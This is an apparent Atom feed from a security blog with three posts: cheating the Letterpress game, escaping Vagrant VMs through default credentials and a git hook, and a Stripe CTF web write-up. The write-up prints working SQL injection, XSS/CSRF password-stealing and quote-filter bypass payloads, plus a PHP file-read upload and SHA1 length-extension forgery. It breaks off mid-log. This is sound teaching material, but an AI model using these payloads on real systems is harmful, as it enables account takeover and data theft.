<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: security | Finite State]]></title>
  <link href="http://stateio.github.com/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://stateio.github.com/"/>
  <updated>2014-01-04T04:43:03-05:00</updated>
  <id>http://stateio.github.com/</id>
  <author>
    <name><![CDATA[State Machinery]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hacking Letterpress]]></title>
    <link href="http://stateio.github.com/blog/2012/11/09/hacking-letterpress/"/>
    <updated>2012-11-09T14:38:00-05:00</updated>
    <id>http://stateio.github.com/blog/2012/11/09/hacking-letterpress</id>
    <content type="html"><![CDATA[<p><a href="http://www.atebits.com/letterpress/">Letterpress</a> is an iOS game
that came out a few weeks ago and immediately became popular enough to <a href="https://twitter.com/marcoarment/statuses/261337316268859392">take down Apple's GameCenter</a>. It's a cross between <a href="http://daringfireball.net/linked/2012/10/24/letterpress">Scrabble and Go</a>. The game is played on a board made out of 25 letters and players take turns building words in order to capture the letters they use.</p>

<p>I was hopelessly addicted to Letterpress until I figured out how to win consistently.</p>

<p><img src="/assets/images/letterpress/winning.png" alt="winning" /></p>

<p>As it turns out, Letterpress's dictionary and word check is stored and performed locally on your
phone. By simply adding words to Letterpress's dictionary, you can register any
combination of letters as a valid word.</p>

<p>Inside your iPhone, the dictionary is spread across a
series of text files located in <code>/&lt;Letterpress
folder&gt;/Letterpress.app/o/[ab-zz].txt</code>. For instance, <code>ab.txt</code>
contains all the words that begin with aa, and so on and so forth.</p>

<p>However, digging around a bunch of text files is no fun, and so I decided to
write a tool to help me out.</p>

<p>By the way, the author of Letterpress does <a href="https://twitter.com/lorenb/status/261617107656138752">know</a> about people cheating this way.</p>

<h2>Automating Letterpress cheating</h2>

<p>First of all, it's a common misconception that you need to jailbreak a
phone in order to access an individual app's files.
Tools like
<a href="http://www.macroplant.com/iexplorer/">iExplorer</a> allow you to, among
other things, access an app's directory and modify the files there on any iPhone. (It's my understanding that they're using undocumented calls in the library iTunes uses for syncing in order to
pull this off.)</p>

<p>Since I didn't want to rely on a third party paid tool like iExplorer,
I decided to use libimobiledevice.
<a href="http://www.libimobiledevice.org/">libimobiledevice</a>. Libimobiledevice
is an open-source library for talking to iDevices over USB. It's capable of providing
access to the filesystem, the iPhone internals, and much more.
Libimobiledevice supports both OS X and Linux.</p>

<p>So, I wrote a ruby gem that acts as an adapter for
libimobiledevice and exposes some of the API calls in an object-oriented way. It's available on github as
<a href="https://github.com/stateio/imobiledevice">imobiledevice</a>. So far, I have
implemented only the small subset of libimobiledevice that I need,
but I definitely welcome pull requests.</p>

<p>Once I had a ruby wrapper for for libimobiledevice, it was simple to
write an app that adds arbitrary words to the Letterpress dictionary.
I call it
<a href="https://github.com/stateio/letterpress-lexicographer">letterpress-lexicographer</a>.
Here's how it works:</p>

<h2>Is this a word?</h2>

<p><img src="/assets/images/letterpress/before.png" alt="Before" /></p>

<h2>Shucks!</h2>

<p><code>
./letterpress-lexicographer.rb
 [*] Connecting to iDevice
 [*] Connected to iDevice. UDID:REDACTED
 [*] Accessing Letterpress app
 [*] Accessed Letterpress app
 [?] What word would you like to add? (/q to quit)
  -&gt; szug
 [+] Reading word-list /Letterpress.app/o/sz.txt
 [+] Inserting word szug into word-list /Letterpress.app/o/sz.txt
 [+] Successfully added word szug.  You can play it now!
</code></p>

<h2>Let's try again</h2>

<p><img src="/assets/images/letterpress/after.png" alt="After" /></p>

<p>You can find the app <a href="https://github.com/stateio/letterpress-lexicographer">here</a>.  Please enjoy responsibly.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Breaking in and out of Vagrant]]></title>
    <link href="http://stateio.github.com/blog/2012/10/30/breaking-in-and-out-of-vagrant/"/>
    <updated>2012-10-30T00:32:00-04:00</updated>
    <id>http://stateio.github.com/blog/2012/10/30/breaking-in-and-out-of-vagrant</id>
    <content type="html"><![CDATA[<p><a href="http://vagrantup.com/">Vagrant</a> is a great tool that allows you to
easily spawn and configure lightweight VMs to use as development
environments. Vagrant provides base installs of several flavours of
Linux, and takes care of setting up networking and shared folders for
you.</p>

<p>Vagrant is really useful for managing your development environment,
and I highly recommend it. If you're doing a lot of development,
you might need to be running all kinds of application and database
servers on your machine, and it's probably a much better idea to run
them in a VM rather than on your host machine.</p>

<p>Unfortunately, if you expose your Vagrant VMs (or any development VMs
really) to the outside world, what seemed like a secure best practice
can end up being very insecure. This isn't a novel concept, but the
disposable nature of virtual machines makes it easy to forget to think
about their security. A common attitude is "What's the worst that can
happen if someone gets on my development VM? I blow away and
re-generate this VM every half hour anyway, and aren't VM escape bugs
rare and esoteric anyway?"</p>

<p>I'm going to show a really simple way to break out of Vagrant VMs, but first,</p>

<h2>How Vagrant is Used </h2>

<p>Vagrant VMs are designed to be lightweight and built per-project. The
VMs around a concept of "base boxes," which are base installs of
various flavours of linux. You initialize a Vagrant VM from a base
box, and then can install your desired environment.</p>

<p>By default, Vagrant shares your project folder
with the VM at <code>/vagrant/</code>. So, a usual workflow would be:</p>

<p><code>bash
host: $ cd /my/project/here/
host: $ #we're going to base our VM on an Ubuntu Lucid 32bit base box
host: $ vagrant box add lucid32 http://files.vagrantup.com/lucid32.box
host: $ vagrant init lucid32
host: $ vagrant up
host: $ vagrant ssh
  vm: $ #now we are on the VM
  vm: $ cd /vagrant/
  vm: $ run_my_server
</code>
You can then edit the code on your host machine, and use the VM to run an applciation and database server.</p>

<h2>Bridging the Network</h2>

<p>Just like in any virtual machine, you can configure your Vagrant VMs'
networking to run in host-only mode or in bridged mode. In host-only
mode, a VM uses a virtual network adapter and is basically only
accessible from the host. In bridged mode, the VM bridges through the
network adapter of the host machine, and actually connects to the same
network as the host. So, for example, if you bridge a VM to a wifi
device, the VM will have a different IP address on the same wifi
network as the host. And of course, you'll be able to access the VM
from other machines on the wifi network. In host-only mode, the VM is
not accessible from outside the host. As they say, NAT is the poor
man's firewall.</p>

<p>The Vagrant
<a href="http://vagrantup.com/v1/docs/bridged_networking.html">documentation</a>
doesn't mention any security risks of running development VMs in
bridged mode. There's a promising alert box, but the contents are:</p>

<blockquote><h4>Not All Networks Work!</h4>

<p>Some networks will not work properly with bridged networking. Specifically, I've found that hotel networks, airport networks, and generally public-shared networks have configurations in place such that bridging does not work.
You can tell if the bridged networking worked successfully by seeing if the virtual machine was able to get an IP address on the bridged adapter.</p></blockquote>

<p>The author doesn't seem to see any intrinsic problem with running Vagrant VMs in hotels, airports, and coffee-shops outside of it sometimes not working.</p>

<h2>Breaking In</h2>

<p>So after scanning the airport wifi, you found someone running a
Vagrant VM in bridged mode. How do you get in? First of all, they are
most like likely doing some kind of development on it, so the VM is
probably running an app that's not very secured. There's also a good
chance that this VM is running a database and maybe CouchDB or Redis.
One of these is probably using guessable credentials (this is the
development environment after all), or the app itself might have an
exploitable bug.</p>

<p>All of the above sounds too hard. Remember the <code>vagrant ssh</code> command
above? Well, it has to get in somehow.</p>

<p>On all of the VMs built from official base boxes, like <code>lucid32</code> the
credentials are <code>vagrant : vagrant</code>. The instructions for developers
building new base boxes actually say not to use password-based SSH
logins. Instead, anyone building a base box for public consumption is
using these <a href="https://github.com/mitchellh/vagrant/tree/master/keys/">SSH keys</a> for the
<code>vagrant</code> user.</p>

<p>Either way, any Vagrant VM built from a public base box (read: almost
all of them) is going to be accessible with either <code>vagrant : vagrant</code>
or the SSH keys above.</p>

<h2>Breaking Out </h2>

<p>Breaking into a development VM isn't a big deal on it's own,
especially since the vagrant workflow encourages blowing-away and
rebuilding the VM often. What you really want is code execution on the
host, and it's going to be surprisingly easy to do that.</p>

<p>The Vagrant workflow encourages you to edit your code outside the VM.
That's why Vagrant helpfully shares the project directory as
<code>/vagrant/</code> in the VM. It's a safe assumption that anyone using
Vagrant for development is using some kind of version control, and if
that's the case, they are probably going to be interacting with it on
the host machine (where they edit the code). This is how we'll get
execution on the host.</p>

<p>For simplicity, I'm going to focus on Git, but this trick should work
for any other commonly used VCS. Hooks are little shell scripts that
run after you commit a certain action. For instance, a <code>post-commit</code>
hook is a shell script that git will execute every time a commit is
completed. Hooks are places in <code>.git/hooks/HOOK-NAME</code>.</p>

<p>So if I get on a Vagrant VM and want to escape into the host, all I
have to do is create a post-commit hook. I simply put evil things in
<code>/vagrant/.git/hooks/post-commit</code> and wait for the user to commit some
code. Since the <code>/vagrant/</code> directory is mounted from the host, my
hook will persist even if the user destroys the VM.</p>

<p>If you liked this, you should follow me on <a href="https://twitter.com/mveytsman">twitter</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My solutions to the Stripe CTF (web app edition)]]></title>
    <link href="http://stateio.github.com/blog/2012/08/30/my-solutions-to-the-stripe-ctf-web-app-edition/"/>
    <updated>2012-08-30T17:55:00-04:00</updated>
    <id>http://stateio.github.com/blog/2012/08/30/my-solutions-to-the-stripe-ctf-web-app-edition</id>
    <content type="html"><![CDATA[<p>Stripe recently ran a <a href="https://stripe-ctf.com">CTF</a> focused on web application hacking.  It ended yesterday, and I decided to write up my solutions.  If you have any questions or find a bug in my solutions, you can reach me at <strong>max [at] state.io</strong>.</p>

<p>First of all, I had an great time solving these challenges.  Big thanks to the Stripe team for creating such a fun game. I hope to see more CTFs from them in the future.</p>

<p>Now, onto the challenges!</p>

<h2>Level 0</h2>

<p>The zeroth level was a pretty basic SQL injection that served as an introduction to the game mechanics and what's expected from the player.  That 7000 participants number comes from the number of people who completed level 0 and officially entered the competition.</p>

<p>The Secret Safe is a web page that allows you to store secrets by specifying a namespace, a name, and a secret.  Secrets are queried by namespace, and somewhere in the secret database is the password for the next level.  Each secret is stored with a key of <code>NAMESPACE.TITLE</code>, and when you query the database for a given namespace you are getting back all of the keys in that namespace.  Of course you can try guessing the namespace that the password is stored in, or...</p>

<p>The relevant lines are:</p>

<p><code>javascript
var query = 'SELECT * FROM secrets WHERE key LIKE ? || ".%"';
db.all(query, namespace, function(err, secrets) { //...
</code></p>

<p>By querying the site for secrets in the namespace of <code>%</code>, you cause the SQL query that is executed to evaluate to <code>SELECT * FROM secrets WHERE key LIKE %.%</code> which of course will spit out every secret stored in every namespace, including the password.</p>

<p><img src="/assets/images/stripe-ctf/level0-solved.png" alt="Level 0 Solved" /></p>

<h2>Level 1</h2>

<p>Level 1 is a "guessing game."  You're asked to guess a secret combination, and given the next level's password if your guess is correct.  The code is below:</p>

<p>``` php
&lt;?php
  $filename = 'secret-combination.txt';
  extract($_GET);
  if (isset($attempt)) {</p>

<pre><code>$combination = trim(file_get_contents($filename));
if ($attempt === $combination) { 
  echo "&lt;p&gt;How did you know the secret combination was" .
       " $combination!?&lt;/p&gt;";
  $next = file_get_contents('level02-password.txt');
  echo "&lt;p&gt;You've earned the password to the access Level 2:" .
       " $next&lt;/p&gt;";
} else {
    echo "&lt;p&gt;Incorrect! The secret combination is not $attempt&lt;/p&gt;";
}
</code></pre>

<p>  }
?>
<code>``
The problem is</code>extract($<em>GET)<code>on line 3. </code>extract<code>will take a hash and load all of its values into the symbol table.  Running this on</code>$</em>GET<code>is dangerous for obvious reasons, and the PHP [manual](http://php.net/manual/en/function.extract.php) does warn loudly about this.  If we supply</code>filename<code>as one of the GET parameters, Iwecan redefine the</code>$filename` variable.  Now all we have to do is supply a filename of a file whose contents we know, and submit those contents as our guess.</p>

<p>There are a lot of ways to do this, but I found it most natural to choose a filename that doesn't exist, and supply an empty string as my guess.  Because the script doesn't really deal with errors, this will result in a correct attempt.  My final querystring was <code>attempt=&amp;filename=DOESNOTEXIT</code></p>

<p><img src="/assets/images/stripe-ctf/level1-solved.png" alt="Level 1 Solved" /></p>

<h2>Level 2</h2>

<p>Level 2 presents you with a "social network," where you have the opportunity to upload your avatar image.  The password for the next level is stored in a text file on the server.  As it turns out, you can upload any kind of file you want, not just images.  And this includes PHP files, which the server will happily execute when you navigate to the URL of the uploaded script.  You can even get a handy directory listing:</p>

<p><img src="/assets/images/stripe-ctf/level2-directory_listing.png" alt="Level 2 Directory Listing" /></p>

<p>Above you can see a bunch of files that I uploaded, and even a false attempt at the challenge.  Having a place to dump scripts and other files is going to come in handy for the later challenges.</p>

<p>To solve this level, all we have to do is upload a file with a PHP script that echoed the password and navigate to it:
<code>php
&lt;?php
$password = file_get_contents('../password.txt');
echo $password;
?&gt;
</code></p>

<h2>Level 3</h2>

<p>Level 3 is a more secure implementation of the Secret Safe from level 0, and is once again solved by SQL injection.  In level 3, the secrets are segregated by user, and to view a secret you have to log in with a password.  Passwords are stored salted and hashed.</p>

<p>The relevant lines are
``` python
query = """SELECT id, password_hash, salt FROM users</p>

<pre><code>       WHERE username = '{0}' LIMIT 1""".format(username)
</code></pre>

<p>cursor.execute(query)</p>

<p>res = cursor.fetchone()</p>

<p>if not res:</p>

<pre><code>return "There's no such user {0}!\n".format(username)
</code></pre>

<p>user_id, password_hash, salt = res
calculated_hash = hashlib.sha256(password + salt)</p>

<p>if calculated_hash.hexdigest() != password_hash:</p>

<pre><code>return "That's not the password for {0}!\n".format(username)
</code></pre>

<p>flask.session['user_id'] = user_id
```</p>

<p>To log in as our target user, we need the <code>password_hash</code> from the database to match our supplied password salted and hashed.</p>

<p>Using a SQL injection, we can cause the query to return our precomputed values as the <code>password_hash</code> of a given user.  When we try to log in with the username <code>a' UNION SELECT ID, HASH, SALT;--</code>, the SQL query becomes <code>SELECT id, password_hash, salt FROM users WHERE username = 'a' UNION SELECT ID, HASH, SALT</code></p>

<p>Since there is no user 'a', the above will return one row, which contains the id, password hash, and salt that we supply.  We pick an arbitrary password and salt, compute the hash, and use that to be able to log in as any user.  Logging in as user 3 will give the password to the next level (the other users contain the solution to P=NP and the like).</p>

<h2>Level 4</h2>

<p>Level 4 is a karma trading game.  You register as a user, and then can transfer karma to other users in the game.  To keep things honest, if a user transfers you karma, you also get to see their password.</p>

<p><img src="/assets/images/stripe-ctf/level4.png" alt="Level 4" /></p>

<p>The user karma_fountain's password is the password to the next level, so if karma_fountain gives you karma, you also get the password to the next level.</p>

<p>We have to force karma_fountain to transfer us some karma.  Inducing a user on a social site to take some action is usually a job for XSS + CSRF, we have to inject some javascript that karma_trader's browser will execute that will send a request to transfer us some karma.  By the way, I am very impressed at the Stripe team for automating the process they used to grade the XSS challenges.  Greg Brockman has a blog <a href="https://blog.gregbrockman.com/2012/08/system-design-stripe-capture-the-flag/">post</a> that addresses how they did this along with some other insights into building a CTF at this scale.</p>

<p>The only user supplied value that other users can see is our password after we give them karma, so we have to inject into that.  Registering a user with the username 'attacker' and the password <code>&lt;script&gt;$.post("transfer", {"to" : "attacker", "amount":10})&lt;/script&gt;</code> will cause any user we give karma to see our password, have their browser execute the javascript within it, and transfer us some karma too.</p>

<p>Transferring karma to karma_trader from attacker completes the challenge:</p>

<p><img src="/assets/images/stripe-ctf/level4-solved.png" alt="Level 4 Solved" /></p>

<h2>Level 5</h2>

<p>Level 5 is DomainAuthenticator, a federated login service.  You supply a username, password, and pingback URL.  If the pingback URL returns 'AUTHENTICATED' when supplied with your credentials, you are authenticated for the domain of the pingback URL. If you can get authenticated for the level 5 domain, you can go on to the next challenge.</p>

<p>The two things to notice in the code are how the user input is handled on POST requests:
<code>ruby
post '/*' do
  pingback = params[:pingback]
  username = params[:username]
  password = params[:password]
  # ...
</code>
and how authentication is validated
<code>ruby
def authenticated?(body)
  body =~ /[^\w]AUTHENTICATED[^\w]*$/
end
</code></p>

<p>The first obvious move is to get authenticated somewhere.  The DomainAuthenticator server is limited to making outbound network requests only to other stripe servers, but luckily we can make arbitrary uploads to another stripe CTF server --- level 2.  Simply uploading a file that contains the string "AUTHENTICATED" to the level 2 upload field and using that as a pingback URL will allow us to authenticate with the level 2 domain with any username/password.</p>

<p>After authenticating, stripe responds with: "Remote server responded with: AUTHENTICATED. Authenticated as user@level02-2.stripe-ctf.com!"  That got us in as a user of level02-2.stripe-ctf.com, but we want to be logged in as a user of level05-2.stripe-ctf.com.  The key observation here is that the regular expression used in <code>authenticated</code> matches per line, so we only need one of the lines of the response body to match.  If we make sure that the file we uploaded to level2 contains a new line after AUTHENTICATED, the response after authentication will be "Remote server responded with: AUTHENTICATED\n. Authenticated as user@level02-2.stripe-ctf.com!", which will match that regular expression.  Since that response is coming from level05-2.stripe-ctf.com, that's enough to get us in.</p>

<p>The <code>params</code> variable in Sinatra contains both POSTed data and values in the query string, so we can specify a pingback in the URL and it will still be picked up in a POST request.  I uploaded a file that contains the string "AUTHENTICATED\n" to level 2 at the URL <code>https://level02-2.stripe-ctf.com/user-iinxtuvzks/uploads/auth</code>, and then my pingback URL was  <code>https://level05-2.stripe-ctf.com/user-rpyvuiltkk/?pingback=https://level02-2.stripe-ctf.com/user-iinxtuvzks/uploads/auth</code>.  This causes the body of a response on the level-5-2.stripe-ctf.com domain to match the regex in <code>authenticated?</code>, and I am authenticated on the level 5 domain.</p>

<p>As a sidenote, after solving this challenge the first time, when I came back to gather screenshots, I found that I could authenticate to the level 5 domain, but was no longer shown the password:</p>

<p><img src="/assets/images/stripe-ctf/level5-solved.png" alt="Level 5 Solved?" /></p>

<p>If anyone knows why I didn't see a password the second time around, please tell me!</p>

<h2>Level 6</h2>

<p>Level 6 is a follow-up to Karma Trader from level 4.  You are able to sign up for Streamer, a Twitter-like service, and post messages.  The target user is 'level07-password-holder' whose password is the password for the next level.</p>

<p>The target user's first post gives a hint about what to do:</p>

<blockquote><p>One great feature of Streamer is that no password resets are needed. I, for
example, have a very complicated password (including apostrophes, quotes, you
name it!). But I remember it by clicking my name on the right-hand side and
seeing what my password is.</p></blockquote>

<p>That is, a user may view their own password in the user info page:</p>

<p>``` html</p>

<div class='row'>
  <div class='span12'>
    <h3>User Information</h3>
    <table class='table table-condensed'>
      <tr>
        <th>Username:</th>
        <td><%= @username %></td>
      </tr>
      <tr>
        <th>Password:</th>
        <td><%= @password %></td>
      </tr>
    </table>
  </div>
</div>


<p>```</p>

<p>Once again, we need to use XSS+CSRF to cause the target user to reveal their password.  In this case we will post a message that contains an XSS vector that causes the viewer to get their password from the user info page and post it as a message.</p>

<p>The injection vector should cause the victim to grab the password from the user info page and post a message.  It will look something like this:</p>

<p>```javascript
$.get('user_info',function (data) {
  $.post('ajax/posts',</p>

<pre><code>{ title: $('td', data)[1].innerHTML, 
  body: 'EMPTY'
});
</code></pre>

<p>});
<code>``
The second</code><td>` tag we select above is the one that contains the user's password in the user info page.</p>

<p>Where are we going to inject into?  The ERB template used to display the messages loads all the posts in JSON format as an object inside a script tag.  The contents of that object are then added to the DOM using javascript.
``` html</p>

<script>
  var username = "<%= @username %>";
  var post_data = <%= @posts.to_json %>;
    
  function escapeHTML(val) {
    return $('<div/>').text(val).html();
  }
  function addPost(item) {
    var new_element = '<tr><th>' + escapeHTML(item['user']) +
                      '</th><td><h4>' + escapeHTML(item['title']) + '</h4>' +
                      escapeHTML(item['body']) + '</td></tr>';
    $('#posts > tbody:last').prepend(new_element);
  }

  for(var i = 0; i < post_data.length; i++) {
    var item = post_data[i];
    addPost(item);
  };
</script>


<p>```</p>

<p>This is where our injection will happen.  We will post a message that contains a closing and then opening script tag. So if we post a message with the body <code>&lt;/script&gt;&lt;script&gt;$.get('user_info',function (data) {$.post('ajax/posts', {title:$('td', data)[1].innerHTML, body:'EMPTY'})});&lt;/script&gt;&lt;script&gt;</code> we get something like</p>

<p>``` html</p>

<script>
  var username = "USERNAME";
  var post_data = [{"id": 1, "title": "Some title", "body": "</script>


<script>$.get('user_info',function (data) {$.post('ajax/posts', {title:$('td', data)[1].innerHTML, body:'EMPTY'})});</script>


<script>[THE REST OF THE LEGITIMATE CODE]</script>


<p>```
The syntax highlighting above should make it clear that our javascript will be executed as such.</p>

<p>There are still a couple of hurdles to get through.  One is that for security purposes, all user input is filtered for quotes:</p>

<p>``` ruby
def self.safe_insert(table, key_values)
  key_values.each do |key, value|
  # Just in case people try to exfiltrate
  # level07-password-holder's password
  if value.kind_of?(String) &amp;&amp;</p>

<pre><code>  (value.include?('"') || value.include?("'"))
raise "Value has unsafe characters"
</code></pre>

<p>  end
end
```</p>

<p>Another is that in order to prevent CSRF attackers, there is a CSRF token that is required with every request.</p>

<p>Let's leave the quotes issue for now and get around the CSRF token. We can get a correct CSRF token the same way that we got the user's password, by selecting the HTML element that contains the CSRF token.  The token is contained in a hidden input fields, so our injection becomes:</p>

<p>``` html
</script><script>
  $.get('user_info', function (data) {</p>

<pre><code>$.post('ajax/posts', 
  { 
    title:$('td', data)[1].innerHTML, 
    body:'EMPTY', 
    _csrf:$('input[name="_csrf"]') 
   });
</code></pre>

<p>   });
</script><script>
```</p>

<p>This of course won't work because the quote filter will prevent us from posting a message will all of those quotes.  We can get around this by encoding each character in our javascript as its ASCII value and then running it like <code>eval(String.fromCharCode(67,61//...)</code>.  I used <a href="http://www.wocares.com/noquote.php">this</a> utility to help me encode everything.</p>

<p>The above payload, when encoded with <code>String.fromCharCode</code> still doesn't work, and it took me a long time to figure out why.</p>

<p>As it turns out, the target user's first post gives a big hint</p>

<blockquote><p>One great feature of Streamer is that no password resets are needed. I, for
example, have a very complicated password <strong>(including apostrophes, quotes, you
name it!)</strong>. But I remember it by clicking my name on the right-hand side and
seeing what my password is.</p></blockquote>

<p>The password contains some quotes so the target user won't be able to post it in a message.  We have to replace the quotes with something else.  The correct javascript is
``` javascript
$.get('user_info', function (data) {
  $.post('ajax/posts',</p>

<pre><code>{ 
  title:$('td', data)[1].innerHTML.replace(/"/g, "&amp;quot;"), 
  body:'EMPTY', 
  _csrf:$('input[name="_csrf"]') 
});
</code></pre>

<p>});
<code>``
And when the above is encoded with</code>String.fromCharCode<code>and put inside a</code><script>` tag, the target user will post their password when viewing our post:</p>

<p><img src="/assets/images/stripe-ctf/level6-solved.png" alt="Level 6 Solved" /></p>

<h2>Level 7</h2>

<p>Level 7 is WaffleCopter, an API for the delivery of waffles by helicopter.  When you log in, you're given a secret key.  You use this to sign a message ordering a delivery of waffles to your location.  Winning requires you to order one of the decadent Liège Waffles that the account you are given doesn't have access to.</p>

<p>An order is a post request with a signature, and you can view your previous orders and the orders of other users by navigating to "/logs/USERID".</p>

<p><img src="/assets/images/stripe-ctf/level7-orders-1.png" alt="Level 7 Orders" /></p>

<p>This is an order log for another user.  We know that this user is a premium subscriber because they are ordering the Dream waffle which is a premium item like the Liège waffles we have to order.</p>

<p>To order a premium waffle we need this user's secret token. We can try and guess their password, or we can just order as them and forge their signature.</p>

<p>The signature is computed as so:</p>

<p>``` python
def _signature(self, message):</p>

<pre><code>h = hashlib.sha1()
h.update(self.api_secret + message)
return h.hexdigest()
</code></pre>

<p>```</p>

<p>I was lucky enough to have read a very relevant <a href="http://netifera.com/research/flickr_api_signature_forgery.pdf">paper</a> about Flickr API key forgery just last week, and so was well primed to solve this one.  Like MD5, SHA1 splits a message into blocks of a fixed size and then does a computation block by block, using the previous block's results in the next.  This means that if I know what <code>sha1(foo)</code> is, I can compute that hash of a message that starts with <code>foo</code> and contains some arbitrary value <code>bar</code>.  In practice, you end up being able to compute some <code>PADDING</code> and the hash <code>sha1(foo + PADDING + bar)</code>.</p>

<p>The signature algorithm used by WaffleCopter is <code>sha1(SECRET + MESSAGE)</code>, so we generate the hash <code>sha1(SECRET + MESSAGE + PADDING + EVIL)</code>.  This is enough to order the Liège waffle.  I simply take a known order from another user, and generate a signature for a message that starts with their order and ends with <code>&amp;waffle=liege</code>.</p>

<p>I found a handy script to perform a SHA1 padding attack <a href="http://www.vnsecurity.net/2010/03/codegate_challenge15_sha1_padding_attack/">here</a>.</p>

<p><img src="/assets/images/stripe-ctf/level7-padding.png" alt="Level 7 SHA1 Padding Attack" /></p>

<p>Running it I was able to generate a new message and signature, and submitting that allowed me to order the Liège Waffle.</p>

<p>This level and the next were my favorites in the competition.  This challenge has you exploit a real world cryptographic attack against a signature scheme that is often found in practice.  Signature schemes that work this way are definitely out there --- see, for example, the Flickr paper linked above.</p>

<p>By the way, if you're reading this and wondering how to construct a signature scheme that's robust to these kinds of attacks, the answer is use an <a href="http://en.wikipedia.org/wiki/Hash-based_message_authentication_code">HMAC</a>!  As you can see, rolling your own signature scheme is dangerous.  Always, always, always use an HMAC.  This is true not just for signatures but for other sensitive user controlled data you want to send down the pipe, such as viewstates.</p>

<h2>Level 8</h2>

<p>Level 8 is PasswordDB, "a new and secure way of storing and validating passwords."  The interface is a simple JSON API, you post <code>{"password": PASSWORD_GUESS, "webhooks":[URL]}</code> to a URL, and you get a response, either <code>{"success": true}</code> or <code>{"success": false}</code>.  That response is also posted to the URL you provide.</p>

<p>Internally, the password is chunked into 4 chunks and spread ac cross 4 services.  When you submit a password guess, your guess is also chunked and each chunk is sent to the corresponding service to check.</p>

<p>``` python
def process(self, data):</p>

<pre><code>Shield.registerLocker()

password = self.getArg(data, 'password')
webhooks = self.getArg(data, 'webhooks')

self.start_time = time.time()

self.remaining_chunk_servers = self.chunk_servers[:]
self.remaining_chunks = self.chunkPassword(password)

self.webhooks = [common.parseHost(webhook) for webhook in webhooks]

self.checkNext()
</code></pre>

<p>def checkNext(self):</p>

<pre><code>assert(len(self.remaining_chunks) == len(self.remaining_chunk_servers))

if not self.remaining_chunk_servers:
    self.sendResult(True)
    return

next_chunk_server = self.remaining_chunk_servers.pop(0)
next_chunk = self.remaining_chunks.pop(0)

self.log_info('Making request to chunk server %r'
              ' (remaining chunk servers: %r)' %
               (next_chunk_server, self.remaining_chunk_servers))

common.makeRequest(next_chunk_server,
                   {'password_chunk' : next_chunk},
                   self.nextServerCallback,
                   self.nextServerErrback)
</code></pre>

<p>def nextServerCallback(self, data):</p>

<pre><code>parsed_data = json.loads(data)
# Chunk was wrong!
if not parsed_data['success']:
    # Defend against timing attacks
    remaining_time = self.expectedRemainingTime()
    self.log_info('Going to wait %s seconds before responding' %
                  remaining_time)
    reactor.callLater(remaining_time, self.sendResult, False)
    return

self.checkNext()
</code></pre>

<p>```</p>

<p>This was definitely the most fun of the challenges.  There's no SQL injection or XSS to exploit here.  The password is known to be 12 digits long, which is way too long to bruteforce.</p>

<p>The first key observation to make is that if the first chunk is wrong, PasswordDB will never query the second chunk server. This is a common pattern in timing attacks: if you compare password with <code>guess == correct_password</code>, the == operator will return false after the first pair of characters differ.  You can use this information to determine the password character by character by timing how long server responses take.</p>

<p>Performing a practical timing attack over a noisy network is <a href="http://events.ccc.de/congress/2011/Fahrplan/events/4640.en.html">challenging</a>, but can be very <a href="http://www.nds.rub.de/media/nds/veroeffentlichungen/2012/07/11/XMLencBleichenbacher.pdf">fruitful</a>.</p>

<p>The Stripe CTF folks did add some random delays to the false responses to defend timing attacks, and did make it really clear that it's not what they are looking for.  Like the author of the papers above, I am of the opinion that it may be theoretically possible to use statistical methods to subtract the noise of a uniform random delay like the one that they use, but let's take them at their word and not try a timing attack.</p>

<p>Earlier in the contest, there was a hint about how the challenge server is using a specific version of the Python Twisted library, but it was removed at some point in the contest.  I couldn't find anything fruitful in the Twisted release notes, but that hint did imply that the vulnerability will come from the network layer and not necessarily from some error in the application code.</p>

<p>The second key observation is one that you can make by observing the server logs when you run it on your machine, and one of the hints tells you to do exactly that.</p>

<p>Below I launched the PasswordDB server with the password "123456789012" and then submitted a guess "123456789000", that differed only in the last chunk:</p>

<p><code>
(ve)sartre:level08-code maxim$ ./password_db_launcher "123456789012" localhost:8000
Split length 12 password into 4 chunks of size about 3: ['123', '456', '789', '012']
Checking whether 127.0.0.1:14434 is reachable
Checking whether 127.0.0.1:14435 is reachable
Checking whether 127.0.0.1:14436 is reachable
Checking whether 127.0.0.1:14437 is reachable
Launched ['./chunk_server', '127.0.0.1:14434', '123'] (pid 9576)
Launched ['./chunk_server', '127.0.0.1:14435', '456'] (pid 9577)
Launched ['./chunk_server', '127.0.0.1:14436', '789'] (pid 9578)
Launched ['./chunk_server', '127.0.0.1:14437', '012'] (pid 9579)
Checking whether 127.0.0.1:14434 is reachable
Checking whether 127.0.0.1:14435 is reachable
Checking whether 127.0.0.1:14436 is reachable
Checking whether 127.0.0.1:14437 is reachable
Launched ['./primary_server', '-l', '/tmp/primary.lock', '-c', '127.0.0.1:14434', '-c', '127.0.0.1:14435', '-c', '127.0.0.1:14436', '-c', '127.0.0.1:14437', 'localhost:8000'] (pid 9580)
[127.0.0.1:58877:1] Received payload: '{"password": "123456789000", "webhooks": ["localhost:1111"]}'
Acquiring lock
[127.0.0.1:58877:1] Split length 12 password into 4 chunks of size about 3: [u'123', u'456', u'789', u'000']
[127.0.0.1:58877:1] Making request to chunk server ('127.0.0.1', 14434) (remaining chunk servers: [('127.0.0.1', 14435), ('127.0.0.1', 14436), ('127.0.0.1', 14437)])
[127.0.0.1:58878:1] Received payload: '{"password_chunk": "123"}'
[127.0.0.1:58878:1] Request already finished!
[127.0.0.1:58878:1] Responding with: '{"success": true}\n'
[127.0.0.1:58877:1] Making request to chunk server ('127.0.0.1', 14435) (remaining chunk servers: [('127.0.0.1', 14436), ('127.0.0.1', 14437)])
[127.0.0.1:58879:1] Received payload: '{"password_chunk": "456"}'
[127.0.0.1:58879:1] Request already finished!
[127.0.0.1:58879:1] Responding with: '{"success": true}\n'
[127.0.0.1:58877:1] Making request to chunk server ('127.0.0.1', 14436) (remaining chunk servers: [('127.0.0.1', 14437)])
[127.0.0.1:58880:1] Received payload: '{"password_chunk": "789"}'
[127.0.0.1:58880:1] Request already finished!
[127.0.0.1:58880:1] Responding with: '{"success": true}\n'
[127.0.0.1:58877:1] Making request to chunk server ('127.0.0.1', 14437) (remaining chunk servers: [])
[127.0.0.1:58881:1] Received payload: '{"password_chunk": "000"}'
[127.0.0.1:58881:1] Request already finished!
